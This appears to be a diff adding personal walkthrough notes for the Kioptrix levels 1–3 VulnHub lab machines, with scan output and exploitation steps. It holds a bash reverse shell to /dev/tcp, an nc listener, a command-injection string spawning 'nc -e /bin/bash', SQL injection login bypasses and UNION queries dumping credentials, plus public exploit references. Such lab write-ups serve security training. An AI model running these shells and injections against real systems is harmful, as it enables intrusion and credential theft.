@@ -1,0 +1,124 @@
+### This doc has hacks of kioptrix machines on vulnhub ###
+
+1. Level 1
+
+System : CentOS 4.5
+
+Nmap : 
+
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp open  status      1 (RPC #100024)
+
+enum4linux
+===========================================
+| Share Enumeration on 192.168.33.133 |
+===========================================
+WARNING: The “syslog” option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+Hack : (Directly got the root)
+
+SMB on port 139 (Samba 2.2.1 is vulnerable)
+exploit : https://www.exploit-db.com/exploits/10/
+Compile and run : ./smb-exploit -b 0 192.168.1.1  ## Run command ## 
+
+
+## For Direct terminal root prompt ##
+
+Setup listener 
+nc -nlvp 4444
+
+Use this command to connect back to our attacking box.
+bash -i >& /dev/tcp/192.168.33.129/4444 0>&1
+
+
+
+2. Level 2
+
+System details : Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+
+Nmap : 
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open  ipp      CUPS 1.1
+3306/tcp open  mysql    MySQL (unauthorized)
+
+Hack : 
+
+Sqlinjection on index.php page
+
+Sql Injection Code : admin' or 1=1#
+Complete list of Sqlinjection Bypass login : https://github.com/apoorv1126/Offensive-Security/blob/master/SQLinjection-logiBypass
+
+In the text box type the code as shown below : 
+localhost; /usr/local/bin/nc 192.168.5.1 1234 -e /bin/bash  ## "localhost" to ping as code execute after that only ""
+
+Priv escalation : 
+
+Linex kernal used 2.6.9
+Exploit used : https://www.exploit-db.com/exploits/9479/
+Compilation : gcc 9479.c
+
+- Alternate exploit : https://www.exploit-db.com/exploits/9542/ 
+
+3. Level 3
+
+Vulenrability : 
+- Sql injection 
+- Lotus CMS exploitation : Exploit used - https://github.com/Hood3dRob1n/LotusCMS-Exploit
+
+Nmap : 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+
+gobuster : (Interesting for the phpmyadmin and gallery url)
+
+http://192.168.237.7/.hta (Status: 403)
+http://192.168.237.7/.htaccess (Status: 403)
+http://192.168.237.7/.htpasswd (Status: 403)
+http://192.168.237.7/cache (Status: 301)
+http://192.168.237.7/core (Status: 301)
+http://192.168.237.7/data (Status: 403)
+http://192.168.237.7/favicon.ico (Status: 200)
+http://192.168.237.7/gallery (Status: 301)
+http://192.168.237.7/index.php (Status: 200)
+http://192.168.237.7/modules (Status: 301)
+http://192.168.237.7/phpmyadmin (Status: 301)
+http://192.168.237.7/server-status (Status: 403)
+http://192.168.237.7/style (Status: 301)
+
+Hack : 
+
+Method 1 : CMS Exploit
+- Use lotus CMS exploit(Exploit used as mentioned above)
+- You will find the phpmyadmin page password in /home/www/kioptrix3.com/gallery/gconfig.php
+- Using the phpmyadmin access, access the mysql database and find the system accounts in dev_accounts table.
+- ssh using the credentials found in dev_accounts table of mysql in the above step.
+
+Method 2 : Sql Injection
+- Point of injection : http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos (Parameter id)
+Query on browser :  UNION ALL SELECT 1,2,concat(username,char(58),password),4,5,6 FROM dev_accounts
+
+Other queries for testing: 
+# %20UNION%20SELECT%201,2,3,4,5,6
+# %20UNION%20SELECT%201,@@version,3,4,5,6
+# %20UNION%20ALL%20SELECT%201,2,group_concat%28table_name%29,4,5,6%20from%20information_schema.tables
+
+ or 
+- sqlmap --wizard http://kioptrix3.com/gallery/gallery.php?id=1
+
+Priv-escalation : 
+- User loneferret has sudoers access, so can be escalated easily.
+
+
